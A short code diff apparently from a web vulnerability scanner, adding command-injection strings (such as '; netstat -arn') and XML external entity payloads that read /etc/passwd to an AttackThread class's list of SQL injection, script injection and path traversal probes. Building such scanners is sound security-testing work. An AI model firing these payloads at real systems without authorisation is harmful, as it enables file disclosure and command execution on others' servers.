@@ -289,6 +289,11 @@ public class AttackThread extends Thread {
         "' or '1'+'2'='12",
         "><script>alert(1)</script>",
         "../../../../../foo.bar%00",
-        "..\\..\\..\\..\\..\\etc\\passwd"
+        "..\\..\\..\\..\\..\\etc\\passwd",
+        "; netstat -arn",
+        "'> ls -lisa",
+        "\"' & ping 192.168.0.1",
+        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///dev/random\">]><foo>&xxe;</foo>",        
+        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
     };
 }
